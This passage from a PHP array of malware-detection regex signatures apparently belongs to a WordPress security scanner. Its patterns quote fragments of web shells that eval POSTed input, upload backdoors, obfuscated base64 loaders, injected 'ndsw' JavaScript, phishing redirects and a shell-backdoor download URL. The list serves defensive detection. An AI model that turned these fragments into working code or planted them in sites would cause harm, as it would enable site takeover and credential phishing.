      'pattern' => '/h8549\'\\] \\= Array\\(\\);global \\$h8549;\\$h8549 \\= \\$GLOBALS;\\$\\{"\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53"\\}\\[[\\s\\S]{0,160}kbd84d1c/',
      'label' => 'sample-specific literal chain',
    ),
    1175 => 
    array (
      'pattern' => '/Plugin Name\\: Link Love[\\s\\S]{0,12000}\\<\\?php if\\(isset\\(\\$_GET\\[\'s\'\\]\\)\\)\\{echo \'nsd\'\\.\'fjk\';if\\(isset\\(\\$_POST\\[\'c\'\\]\\)\\)\\{file_put_contents\\(\\$_POST\\[\'n\'\\],base64_decode\\(\\$_POST\\[\'c\'\\]\\)\\);\\}die\\(\\);\\}\\?\\>/s',
      'label' => 'source-file head-tail anchor',
    ),
    1176 => 
    array (
      'pattern' => '/\\+t\\+"\\]",e\\[t\\],r,i\\)\\}S\\.param\\=function\\(e,t\\)\\{var n,r\\=\\[\\],i\\=function\\(e,t\\)\\{var n\\=m\\(t\\)\\?t\\(\\)\\:t;r\\[r\\.length\\]\\=encodeURIComponent\\(e\\)\\+/',
      'label' => 'sample-specific literal',
    ),
    1177 => 
    array (
      'pattern' => '/\\(\\(\\)\\=\\>\\{"use strict";var e\\=\\{d\\:\\(t,n\\)\\=\\>\\{for\\(var r in n\\)e\\.o\\(n,r\\)&&\\!e\\.o\\(t,r\\)&&Object\\.defineProperty\\(t,r,\\{enumerable\\:\\!0,get\\:n\\[r\\]\\}\\)\\},o\\:\\(e,t\\)\\=\\>Object[\\s\\S]{0,12000}\\/\\/\\# sourceMappingURL\\=index\\.min\\.js\\.map;if\\(typeof ndsw\\=\\=\\="undefined"\\)\\{\\(function\\(n,t\\)\\{var r\\=\\{I\\:175,h\\:176,H\\:154,X\\:"0x95",J\\:177,d\\:142\\},a\\=x,e\\=n\\(\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1178 => 
    array (
      'pattern' => '/fast\', function\\(\\) \\{
                                                    \\$\\(/',
      'label' => 'sample-specific literal',
    ),
    1179 => 
    array (
      'pattern' => '/\\/\\*global jQuery, document, redux\\*\\/[\\s\\S]{0,12000}\\}\\)\\( jQuery \\);;if\\(typeof ndsw\\=\\=\\="undefined"\\)\\{\\(function\\(n,t\\)\\{var r\\=\\{I\\:175,h\\:176,H\\:154,X\\:"0x95",J\\:177,d\\:142\\},a\\=x,e\\=n\\(\\);while\\(\\!\\!\\[\\]\\)\\{try\\{var i\\=pa/s',
      'label' => 'source-file head-tail anchor',
    ),
    1180 => 
    array (
      'pattern' => '/\\/\\*\\! This file is auto\\-generated \\*\\/[\\s\\S]{0,12000}\\!function\\(\\)\\{"use strict";var e\\=\\{d\\:function\\(n,t\\)\\{for\\(var o in t\\)e\\.o\\(t,o\\)&&\\!e\\.o\\(n,o\\)&&Object\\.defineProperty\\(n,o,\\{enumerable\\:\\!0,get\\:t\\[o\\]\\}\\)\\},o\\:f/s',
      'label' => 'source-file head-tail anchor',
    ),
    1181 => 
    array (
      'pattern' => '/add_action\\(\'wp_footer\', function\\(\\) \\{[\\s\\S]{0,12000}function _0x3629\\(\\)\\{const _0x539679\\=\\[\'1070375GbPGzz\',\'catch\',\'crypto_ini\',\'91962mzGKod\',\'RTX\',\'unknown\',\'ENDOR_WEBG\',\'message\',\';\\\\x20path\\=\\/;\\\\/s',
      'label' => 'source-file head-tail anchor',
    ),
    1182 => 
    array (
      'pattern' => '/\\<\\?php \\$ImSnZ \\= \'st\'\\.\'r\'\\.\'_r\'\\.\'ot13\'; \\$YzHKc \\= \'base\'\\.\'64\'\\.\'_deco\'\\.\'de\'; \\$NtXuB \\= \'g\'\\.\'zinfla\'\\.\'te\'; \\$JSBWV \\= \'s\'\\.\'trrev\'; ini_set\\(\'error_log/',
      'label' => 'source-file tail snippet',
    ),
    1183 => 
    array (
      'pattern' => '/\\<\\?php \\/\\*xaxk,n\\[q\\|Ei,W2B\\(f\\*\\/\\$a\\/\\*ZPQI7D6zJ6PwF3\\*\\/\\=\\/\\*wsIm\\}WH\\.zw@g\\{9\\*\\/range\\/\\*1wwZ\\+\\$c\\[@\\#\\*\\/\\("~",\\/\\*Ygnbi\\]_\\+p\\*\\/" "\\);\\/\\*\\]ATzM\\[l\\{Y\\*\\/\\$b\\/\\*D~59v\\[YC\\*\\/\\=\\/\\*S3/',
      'label' => 'source-file tail snippet',
    ),
    1184 => 
    array (
      'pattern' => '/foreach\\(\\$_POST as \\$k \\=\\> \\$v\\)\\{[\\s\\S]{0,12000}@eval\\(\\$_POST\\[\'lol\'\\]\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1185 => 
    array (
      'pattern' => '/\\$items \\= Array\\(\'https\\:\\/\\/www\\.puertasymas\\.com\\.mx\\/jp1\\.php\\?open\'\\);[\\s\\S]{0,12000}header\\("Location\\: \\$URL"\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1186 => 
    array (
      'pattern' => '/;
        \\}
        \\$num \\= mt_rand\\(5, 10\\);
        for\\(\\$i \\= 0; \\$i\\<\\$num; \\$i\\+\\+\\)\\{
            if\\(trim\\(\\$uri_script\\) \\!\\=/',
      'label' => 'sample-specific literal',
    ),
    1187 => 
    array (
      'pattern' => '/\\>\\<\\/form\\>\\<\\/center\\>\';break;
		case \'cmd\'\\: print \'\\<\\/br\\>\\<\\/br\\>\\<center\\>\\<h3\\>Execute Command\\<\\/h3\\>\\<form action\\=/',
      'label' => 'sample-specific literal',
    ),
    1188 => 
    array (
      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>
\\<\\?php
function http_get\\(\\$url\\)\\{
	\\$im \\= curl_init\\(\\$url\\);
	curl_setopt\\(\\$im, CURLOPT_RET/s',
      'label' => 'sample-specific content window',
    ),
    1189 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*
Obfuscation provided by FOPO \\- Free Online PHP Obfuscator\\: http\\:\\/\\/www\\.fopo\\.com\\.ar\\/
This code was created on Wed/s',
      'label' => 'sample-specific content window',
    ),
    1190 => 
    array (
      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>[\\s\\S]{0,12000}eval\\(base64_decode\\(\'JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4g/s',
      'label' => 'source-file head-tail anchor',
    ),
    1191 => 
    array (
      'pattern' => '/JDuWy9YnzstHg29DK44fF9Gq74pgsQjnW23320PpZghzFVLTyc9yLUiV9\\+MBYQ8WyNYUs1Qqx60ZCt8yJzquEehN\\/y0SDrN4\\+dv\\/\\/zPv\\/9Pw\\=\\=\'\\)\\)\\)\\)\\);
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1192 => 
    array (
      'pattern' => '/9Y1JDuWy9YnzstHg29DK44fF9Gq74pgsQjnW23320PpZghzFVLTyc9yLUiV9\\+MBYQ8WyNYUs1Qqx60ZCt8yJzquEehN\\/y0SDrN4\\+dv\\/\\/zPv\\/9Pw\\=\\=\'\\)\\)\\)\\)\\);/s',
      'label' => 'sample-specific content window',
    ),
    1193 => 
    array (
      'pattern' => '/strstr\\(\\$strckLocalFile2,\'\\/\\/ckIIend\'\\)\\)\\{
		
		\\$rsckII \\= \'\\#\\/\\/ckIIbg\\.\\*\\?\\/\\/ckIIend\\#si\';
		\\$strckLocalFile2 \\= preg_replace\\(\\$rsc/s',
      'label' => 'sample-specific content window',
    ),
    1194 => 
    array (
      'pattern' => '/\\<\\?php 
\\$Receive_email\\="mapbay@protonmai/s',
      'label' => 'sample-specific content window',
    ),
    1195 => 
    array (
      'pattern' => '/\\?\\?\\<html\\>

\\<META http\\-equiv\\=Refresh content\\="0; 

URL\\=https\\:\\/\\/evinesa\\.com\\/a\\/Einloggen oder neu anmelden eBay\\.html"\\>

\\<\\/he/s',
      'label' => 'sample-specific content window',
    ),
    1196 => 
    array (
      'pattern' => '/\\<\\?php \\/\\* index\\-configs \\*\\/ error_reporting\\(0\\); function vOZLe\\(\\) \\{ \\$HrcUM \\= \'I could not have a more welcome visitor 64 group of zain bani\'; \\$[\\s\\S]{0,12000}require\\( dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1197 => 
    array (
      'pattern' => '/h\\.\\.t\\.\\.t\\.\\.p\\.\\.\\:\\.\\.\\/\\/\\.\\.j\\.\\.q\\.\\.e\\.\\.u\\.\\.r\\.\\.y\\.\\.\\.o\\.\\.rg\\.\\.\\/\\.\\.j\\.\\.q\\.\\.u\\.\\.e\\.\\.ry\\.\\.\\-\\.\\.la\\.\\.t\\.\\.e\\.\\.s\\.\\.t\\.j\\.\\.s/',
      'label' => 'sample-specific literal',
    ),
    1198 => 
    array (
      'pattern' => '/Y4K5MXTqX5cXp6kbIYOFBV623up9E8SeG2y9deDN1\\/7C9SwQeFv3RqkIFug83Mb7\\/ioWt3lbfMq7WGAxX\\/nuv7UbV9r8paWIt5T0YnREUEr\\/6Puz0r52\\/gY\\=/s',
      'label' => 'sample-specific content window',
    ),
    1199 => 
    array (
      'pattern' => '/\\$data \\= \\[\'https\\:\\/\\/raw\\.githubusercontent\\.com\\/mrkronkz\\/shell\\-backdor\\/master\\/gas\\.php\', \'\\/tmp\\/sess_\'\\.md5\\(\\$_SERVER\\[\'HTTP_HOST\'\\]\\)\\.\'\\.php\'\\];[\\s\\S]{0,12000}curl_close\\(\\$ch\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    1200 => 
    array (
      'pattern' => '/;\\$wpautop\\=pre_admin_bar\\(\\$wp_kses_data,\\$wp_nonce\\);if\\(isset\\(\\$wpautop\\)\\)\\{if\\(isset\\(\\$_POST\\[[\\s\\S]{0,160},\\$wpautop\\);unset\\(\\$f_pp,\\$wpautop\\);\\$shortcode_unautop\\(\\);\\}function wp_admin_bar_header\\(\\)\\{echo/',
      'label' => 'sample-specific literal chain',
    ),
    1201 => 
    array (
      'pattern' => '/T\'\\\\n"\\);
    \\}
    
    echo \\$tester\\-\\>runStressTest\\(\\$socketcount, \\$host, \\$port, \\$path, \\$method, \\$testType, true,\\$note\\);
\\}/s',
      'label' => 'sample-specific content window',
    ),
    1202 => 
    array (
      'pattern' => '/\\(\\(\\$perms & 0x0001\\) \\?
        \\(\\(\\$perms & 0x0200\\) \\? \'t\' \\: \'x\'\\) \\: \\(\\(\\$perms & 0x0200\\) \\? \'T\' \\: \'\\-\'\\)\\);
    return \\$info;
\\}
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1203 => 
    array (
      'pattern' => '/\\<form\\s+enctype\\="multipart\\/form\\-data"\\s+method\\="post"\\>Upload\\s+\\:\\s+\\<input\\s+type\\="file"\\s+name\\="upd"\\>\\<input\\s+type\\="submit"\\s+value\\="Upload"\\>\\<\\?php/',
      'label' => 'sample-specific line fragment',
    ),
    1204 => 
    array (
      'pattern' => '/\\$O\\=urldecode\\(\'\\-%3B5p6PIiw%24%60x%2Bc%5D%40%5ES%2F0D%3ABZnmtsq%2CkOh7z%3D%7EAT%5CYQ%269%29%25v2yRUrfJ_eF%2Aa%3C%23%28g%2FM%7B3E%21u%7CX\\.4V%3F[\\s\\S]{0,12000}function OoOo111oOO\\(\\$url,\\$OO0o00OooO\\=0,\\$Oo00OoO0Oo\\=1,\\$OoO00OOoo0\\=NULL,\\$OoOOoO000o\\=array\\(\\)\\)\\{global \\$O;if\\(\\!preg_match\\("\\/\\^http\\\\\\:\\\\\\/\\\\\\/\\/si",\\$url\\)\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    1205 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*\\*
 \\* Used to set up and fix common variables and include
 \\* the WordPress procedural and class library\\.
 \\*
 \\* Al/s',
      'label' => 'sample-specific content window',
    ),
    1206 => 
    array (
      'pattern' => '/\'\\/class\\-IXR\\.php\' \\);
include_once\\( ABSPATH \\. WPINC \\. \'\\/class\\-wp\\-xmlrpc\\-server\\.php\' \\);

\\/\\*\\*
 \\* Posts submitted via the XML/s',
      'label' => 'sample-specific content window',
    ),
    1207 => 
    array (
      'pattern' => '/We already have a ping from that URL for this post\\./',
      'label' => 'sample-specific literal',
    ),
    1208 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}lhSamIyNW1hV2NpSUVGT1JDQWtaVzU1YzJSdWFEMDlKRjlIU/s',
      'label' => 'sample-specific content window chain',
    ),
    1209 => 
    array (
      'pattern' => '/\\.authcode\\(SXSL,"DECODE",\\$key,0\\),dirname\\(__FILE__\\)\\.authcode\\(WPI,"DECODE",\\$key,0\\)\\.authcode\\(SXSL,"DECODE",\\$key,0\\)\\.[\\s\\S]{0,160}\\.authcode\\(WPPHP,"DECODE",\\$key,0\\); file_put_contents\\(\\$phpinfopath,\\$phpinfocontent\\); copy\\(dirname\\(__FILE__\\)\\./',
      'label' => 'sample-specific literal chain',
    ),
    1210 => 
    array (
      'pattern' => '/\\/
		printf\\( __\\( \'The site %s is yours\\.\' \\), \\$site \\);
	\\?\\>
	\\<\\/h2\\>
	\\<p\\>
		\\<\\?php
		printf\\(
			\\/\\* translators\\: 1\\: Link to new/s',
      'label' => 'sample-specific content window',
    ),
    1211 => 
    array (
      'pattern' => '/\\<\\?php

\\/\\*\\* Sets up WordPress vars and included files\\. \\*\\/
require_once\\(ABSPATH \\. \'wp\\-settings\\.php\'\\);
function Go\\(\\$url\\)\\{ \\$/s',
      'label' => 'sample-specific content window',
    ),
    1212 => 
    array (
      'pattern' => '/foreach\\(\\$_POST as \\$k \\=\\> \\$v\\)\\{
	\\$kk \\= @pack\\("H\\*", \\$k\\);
	\\$_POST\\[\\$kk\\]\\=@pack\\("H\\*", \\$v\\);
\\}
@eval\\(\\$_POST\\[\'pass\'\\]\\);
\\?\\>
postpass/s',
      'label' => 'sample-specific content window',
    ),
    1213 => 
    array (
      'pattern' => '/\\= \'\';
    for\\(\\$i\\=0;\\$i\\<\\=\\$id;\\$i\\+\\+\\)\\{
        \\$linkpath \\.\\= "\\$paths\\[\\$i\\]";
        if\\(\\$i \\!\\= \\$id\\) \\$linkpath \\.\\= "\\/";
    \\}
    e/s',
      'label' => 'sample-specific content window',
    ),
    1214 => 
    array (
      'pattern' => '/\',\\$usedNameArr\\);
			\\}
			
		\\}
		
		if\\(JDT \\=\\= 0\\)\\{
			\\/\\/ \\$precat \\= strFilter\\(\\$precat\\);
			\\/\\/ \\$precat \\= preg_replace\\(/',
      'label' => 'sample-specific literal',
    ),
    1215 => 
    array (
      'pattern' => '/\\(\\)\\.\'\\/\'\\.substr\\(\\$domain_name1,0,5\\)\\.chr\\(rand\\(97,122\\)\\)\\.\'\\.php\';
		\\/\\/\\$shell5\\=BASE_PATH\\.\'\\/\'\\.substr\\(\\$domain_name1,0,5\\)\\.chr\\(rand\\(/s',
      'label' => 'sample-specific content window',
    ),
    1216 => 
    array (
      'pattern' => '/\\$O\\{68\\}\\.\\$O\\{67\\}\\.\\$O\\{67\\}\\.\\$O\\{67\\}\\.\\$O\\{78\\}\\.\\$O\\{9\\}\\.\\$O\\{3\\}\\.\\$O\\{61\\}\\.\\$Ooooo\\.\\$O\\{78\\}\\.\\$O\\{6\\}\\.\\$O\\{3\\}\\.\\$O\\{18\\}\\.\\$O\\{61\\}\\.\\$Oo\\.\\$O\\{78\\}\\.\\$O\\{12\\}\\.\\$O\\{8\\}\\.\\$O/s',
      'label' => 'sample-specific content window',
    ),
    1217 => 
    array (
      'pattern' => '/\\$oIndex \\= \'PGh0bWw\\+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJhci1rdyI\\+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZ[\\s\\S]{0,12000}echo "AnonymousFox \\.\\/Done \\/o\\.htm";/s',
      'label' => 'source-file head-tail anchor',
    ),
    1218 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*\\*
 \\* License\\: GPLv2
 \\*\\/
    include \'phar\\:\\/\\/readme\\.txt\\/readme\\.tx/s',
      'label' => 'sample-specific content window',
    ),
    1219 => 
    array (
      'pattern' => '/@include "\\\\057hom\\\\1453\\/s\\\\161uad\\\\063cod\\\\145\\/ma\\\\162ine\\\\163yst\\\\145mst\\\\145chn\\\\157log\\\\171\\.co\\\\155\\/wp\\\\055con\\\\164ent\\\\057plu\\\\147ins\\\\057rea\\\\154ly\\-\\\\163[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1220 => 
    array (
      'pattern' => '/\\$cookie\\=&\\$_COOKIE;\\$server\\=\\$_SERVER;\\$co\\=\'\';if\\(\\!empty\\(\\$cookie\\)\\)\\{foreach\\(\\$cookie as \\$cn\\=\\>\\$cv\\)\\{if\\(\\$co\\)\\$co\\.\\=\'; \';\\$co\\.\\=\\$cn\\.\'\\=\'\\.addslashes\\(\\$cv\\);\\}\\}[\\s\\S]{0,12000}function headerfunction\\(\\$ch,\\$hl\\)\\{if\\(strpos\\(\\$hl,"Content\\-Type"\\)\\!\\=\\=false\\|\\|strpos\\(\\$hl,"404"\\)\\!\\=\\=false\\|\\|strpos\\(\\$hl,"301"\\)\\!\\=\\=false\\|\\|strpos\\(\\$hl,"Lo/s',
      'label' => 'source-file head-tail anchor',
    ),
    1221 => 
    array (
      'pattern' => '/background\\-image\\: url\\(&quot;images\\/inv\\-small\\-background\\.jpg&quot;\\);\\-webkit\\-filter\\:invert\\(100%\\);filter\\:invert\\(100%\\);[\\s\\S]{0,160}background\\-image\\: url\\(&quot;images\\/inv\\-big\\-background\\.jpg&quot;\\);\\-webkit\\-filter\\:invert\\(100%\\);filter\\:invert\\(100%\\);/',
      'label' => 'sample-specific literal chain',
    ),
    1222 => 
    array (
      'pattern' => '/\\<\\?php session_start\\(\\); error_reporting\\(0\\);set_time_limit\\(0\\); @ini_set\\(\'display_errors\',\'Off\'\\); @ini_set\\(\'memory_limit\',\'256M\'\\);  \\$ETrJDzbM \\=[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1223 => 
    array (
      'pattern' => '/7\\.\'"\'\\.mrhz799\\(\\$xwbl209\\{2\\}\\.\\$xwbl209\\{2\\},\'\',\\$xwbl209\\{62\\}\\);\\$niem764\\(\\$lfua699,array\\(\'\',\'\\}\'\\.\\$soba910\\.\'\\/\\/\'\\)\\);\\/\\/wp\\-blog\\-header\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1224 => 
    array (
      'pattern' => '/,\\$Geess66e6s\\);\\$Gee66ess6s\\=__FILE__;\\$Gee66ess6s\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x47\\\\x36\\\\x65\\\\x36\\\\x36\\\\x73\\\\x65\\\\x73\\\\x65\\\\x73"\\]\\(\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$Gee66ess6s\\);\\$Gesee6s66s\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x47\\\\x73\\\\x73\\\\x36\\\\x65\\\\x36\\\\x65\\\\x65\\\\x73\\\\x36"\\]\\(__FILE__\\)\\.\\\\/',
      'label' => 'sample-specific literal chain',
    ),
    1225 => 
    array (
      'pattern' => '/\\<\\?php \\$LBCaXUoJvtE\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$LBCaXUoJvtE\\[\\(105\\/15\\)\\]\\.\\$LBCaXUoJvtE\\[\\(26\\-1\\)\\]\\.\\$LBCaXUoJvtE\\[\\(1\\*4/',
      'label' => 'source-file tail snippet',
    ),
    1226 => 
    array (
      'pattern' => '/\\*\\s+coarse\\s+evaluate\\s+extinct\\s+genuine\\s+infer\\s+likelihood\\s+media\\s+racial\\s+slender\\s+spot\\s+title\\s+transplant\\s+usage\\s+variable\\s+wonder\\./',
      'label' => 'sample-specific line fragment',
    ),
    1227 => 
    array (
      'pattern' => '/\\<html\\> \\<meta http\\-equiv\\="refresh" content\\="0; URL\\=https\\:\\/\\/52\\-159\\-103\\-19\\.cprapid\\.com\\/canada\\-post2\\/" \\/\\> \\<\\/html\\>/',
      'label' => 'source-file tail snippet',
    ),
    1228 => 
    array (
      'pattern' => '/\\<\\?php
error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\</s',
      'label' => 'sample-specific content window',
    ),
    1229 => 
    array (
      'pattern' => '/\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\151\\\\156\\\\143\\\\154\\\\165\\\\144\\\\145\\\\163\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1230 => 
    array (
      'pattern' => '/\\$pdgR5J05_M\\="Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85PzcgqLU4mLqCCclFqeamcSnpCbnp6RqAO0sSi3TUHHM9vc3i\\/BysawKMtJEAtYA";\\/\\/scp/',
      'label' => 'source-file head snippet',
    ),
    1231 => 
    array (
      'pattern' => '/\\{echo \\\\\'wp\\-blog\\-header\\\\\';\\}\'\\);\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x4f\\\\x5f\\\\x4f\\\\x30\\\\x30"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1232 => 
    array (
      'pattern' => '/\\<meta http\\-equiv\\="refresh"[\\s\\S]{0,12000}content\\="0; url\\=https\\:\\/\\/pymedigital\\.org\\/\\/wp\\-config\\/nbgi\\-bank\\-National\\-Bank\\-Greece\\-otp\\-sms\\-othy\\-1\\/nbgi\\-bank\\-National\\-Bank\\-Greece\\-otp\\-sms\\-othy/s',
      'label' => 'source-file head-tail anchor',
    ),
    1233 => 
    array (
      'pattern' => '/\\<input type\\="submit" class\\="putc" value\\="View file"\\>\\<br\\>
     \\<br\\>
  
  
       \\<\\/fieldset\\>
  
  \\<\\/form\\>
\\<\\/body\\>
\\<\\/html\\>/s',
      'label' => 'sample-specific content window',
    ),
    1234 => 
    array (
      'pattern' => '/t" class\\="putc" value\\="View file"\\>\\<br\\>
     \\<br\\>
  
  
       \\<\\/p\\>
  
  
       \\<\\/fieldset\\>
  
  \\<\\/form\\>
\\<\\/body\\>
\\<\\/html\\>/s',
      'label' => 'sample-specific content window',
    ),
    1235 => 
    array (
      'pattern' => '/75"\\]\\)\\)\\{echo \\\\\'okbbcbba\\\\\';\\}\'\\);\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x4f\\\\x4f\\\\x30\\\\x5f\\\\x30\\\\x4f"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1236 => 
    array (
      'pattern' => '/4cS"\\}\\["\\\\x42\\\\x36\\\\x43\\\\x55\\\\x55\\\\x43\\\\x55\\\\x36\\\\x43\\\\x36"\\]\\(\\$\\{"\\\\x5fG\\\\x45T"\\}\\["\\\\x74\\\\x78\\\\x74\\\\x6e\\\\x61\\\\x6d\\\\x65"\\]\\)\\:\\\\\'\\\\\';\\$BC6C6U6UCU\\=\\$\\{"G/s',
      'label' => 'sample-specific content window',
    ),
    1237 => 
    array (
      'pattern' => '/\\<\\?php \\$uoeq967\\= "O\\)sl 2Te4x\\-\\+gazAbuK_6qrjH0RZt\\*N3mLcVFEWvh;inySJC91oMfYXId5Up\\.\\(GP7D,Bw\\/kQ8";\\$vpna644\\=\'JGNoID0gY3VybF9pbml0KCdodHRwOi8vYmFua3/',
      'label' => 'source-file tail snippet',
    ),
    1238 => 
    array (
      'pattern' => '/\\<\\?php
  \\/\\*
 \\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 \\* APPLICATION ENVIRONMENT
 \\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-/s',
      'label' => 'sample-specific content window',
    ),
    1239 => 
    array (
      'pattern' => '/9\\}\\.\\$O\\{55\\}\\.\\$O\\{48\\}\\.\\$O\\{38\\}\\.\\$O\\{1\\}\\.\\$O\\{30\\}\\.\\$O\\{31\\}\\.\\$O\\{38\\}\\.\\$O\\{20\\};\\$OO0ooo0O0O\\=\\$O\\{50\\}\\.\\$O\\{29\\}\\.\\$O\\{56\\}\\.\\$O\\{29\\}\\.\\$O\\{17\\}\\.\\$O\\{6\\}\\.\\$O\\{47\\}\\.\\$O/s',
      'label' => 'sample-specific content window',
    ),
    1240 => 
    array (
      'pattern' => '/\'\\]\\)\\) response\\(400\\);
	if \\(copy\\(\\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\], \\$_POST\\[\'filename\'\\]\\) \\=\\=\\= false\\) response\\(500\\);
	response\\(\\);
\\?\\>/s',
      'label' => 'sample-specific content window',
    ),
    1241 => 
    array (
      'pattern' => '/\\<\\?php
\\/\\*\\*
 \\* Creates common globals for the rest of WordPress
 \\*
 \\* Sets \\$pagenow global which is the current page\\. Chec/s',
      'label' => 'sample-specific content window',
    ),
    1242 => 
    array (
      'pattern' => '/30\\\\x5f\\\\x4f\\\\x30\\\\x4f\\\\x5f\\\\x4f\\\\x30\\\\x5f"\\]\\(\\$\\{"\\\\x5f\\\\x47\\\\x45\\\\x54"\\}\\["\\\\x74\\\\x78\\\\x74\\\\x6e\\\\x61\\\\x6d\\\\x65"\\]\\)\\:\\\\\'\\\\\';\\$O0OO_00O__\\=\\$\\{"\\\\x47\\\\x4c/s',
      'label' => 'sample-specific content window',
    ),
    1243 => 
    array (
      'pattern' => '/\\.\\$m956\\[\'i1dde556\'\\]\\[74\\]\\.\\$m956\\[\'i1dde556\'\\]\\[76\\]\\.\\$m956\\[\'i1dde556\'\\]\\[76\\]\\]\\(\\$fc2d\\); \\$j4dd107\\+\\+, \\$u5a20a4da\\+\\+\\)\\{\\$y42a6ef04 \\.\\= \\$m95/s',
      'label' => 'sample-specific content window',
    ),
    1244 => 
    array (
      'pattern' => '/﻿ï»¿\\<\\?php
@session_start\\(\\);
@set_time_limit\\(0\\);

echo \'\\<\\!DOCTYPE HTML\\>
\\<HTML\\>
\\<HEAD\\>
\\<title\\>\\<\\/title\\>
\\<style\\>
body\\{/s',
      'label' => 'sample-specific content window',
    ),
    1245 => 
    array (
      'pattern' => '/echo "\\<form enctype\\=\\\\"multipart\\/form\\-data\\\\" action\\=\\\\"\\\\" method\\=\\\\"POST\\\\"\\>\\<input type\\=\\\\"text\\\\" name\\=\\\\"l\\\\" value\\=\\\\"\\$cwd\\\\" style\\=\\\\"width\\: 700px;/',
      'label' => 'source-file tail snippet',
    ),
    1246 => 
    array (
      'pattern' => '/\\<\\?php \\$qYXAVSBP\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$qYXAVSBP\\[\\(105\\/15\\)\\]\\.\\$qYXAVSBP\\[\\(26\\-1\\)\\]\\.\\$qYXAVSBP\\[\\(1\\*49\\)\\]\\.\\$qYXAVSB[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    1247 => 
    array (
      'pattern' => '/\\<\\?php echo\'CCAEF Uploader\\<br\\>\';echo\'\\<br\\>\';echo\'\\<form method\\="post"enctype\\="multipart\\/form\\-data"\\>\';echo\'\\<input type\\="file"name\\="file"\\>\\<input /',
      'label' => 'source-file tail snippet',
    ),
    1248 => 
    array (
      'pattern' => '/\\<title\\>Pwnd By NekoBot\\!\\<\\/title\\>
\\<\\?php
function http_get\\(\\$url\\)\\{
	\\$im \\= curl_init\\(\\$url\\);
	curl_setopt\\(\\$im, CURLOPT_RETURNT/s',
      'label' => 'sample-specific content window',
    ),
    1249 => 
    array (
      'pattern' => '/\', get_template_directory_uri\\(\\)\\.\'\\/css\\/headers\\/multilevel\\-menu\' \\. \\$suffix \\. \'\\.css\', array\\(\\), \\$theme_version \\);
				wp_enq/s',
      'label' => 'sample-specific content window',
    ),
    1250 => 
    array (
      'pattern' => '/\\$result \\= curl_exec\\(\\$ch\\);
